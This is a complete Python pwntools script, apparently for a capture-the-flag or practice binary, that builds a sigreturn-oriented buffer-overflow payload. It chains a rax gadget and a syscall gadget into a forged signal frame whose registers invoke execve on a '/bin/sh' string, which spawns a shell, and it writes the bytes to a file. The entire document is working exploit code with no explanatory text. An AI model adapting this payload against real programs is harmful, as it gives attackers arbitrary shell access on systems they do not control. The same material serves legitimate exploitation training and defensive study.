#!/bin/python3

from pwn import *

rax_gadget = 0x40113e
syscall_gadget = 0x401140

binsh_addr = 0x402004

sigreturn_syscall_number = 0xf
execve_syscall_number = 0x3b

padding = 72

exploit = b"A" * (padding)
exploit += p64(rax_gadget) # rip
exploit += p64(sigreturn_syscall_number)
exploit += p64(syscall_gadget)

exploit += p64(0x0) # uc_flags
exploit += p64(0x0) # &uc
exploit += p64(0x0) # uc_stack.ss_sp
exploit += p64(0x0) # uc_stack.ss_flags
exploit += p64(0x0) # uc_stack.ss_size
exploit += p64(0x0) # r8
exploit += p64(0x0) # r9
exploit += p64(0x0) # r10
exploit += p64(0x0) # r11
exploit += p64(0x0) # r12
exploit += p64(0x0) # r13
exploit += p64(0x0) # r14
exploit += p64(0x0) # r15
exploit += p64(binsh_addr) # rdi
exploit += p64(0x0) # rsi
exploit += p64(0x0) # rbp
exploit += p64(0x0) # rbx
exploit += p64(0x0) # rdx
exploit += p64(execve_syscall_number) # rax
exploit += p64(0x0) # rcx
exploit += p64(0x7fffffffdf00) # rsp
exploit += p64(syscall_gadget) # rip
exploit += p64(0x0) # eflags
exploit += p16(51) # cs
exploit += p16(0x0) # gs
exploit += p16(0x0) # fs
exploit += p16(43) # ss
exploit += p64(0x0) # err
exploit += p64(0x0) # trapno
exploit += p64(0x0) # oldmask
exploit += p64(0x0) # cr2
exploit += p64(0x0) # &fpstate
exploit += p64(0x0) # __reserved
exploit += p64(0x0) # sigmask

with open("wer", "wb") as f:
    f.write(exploit)

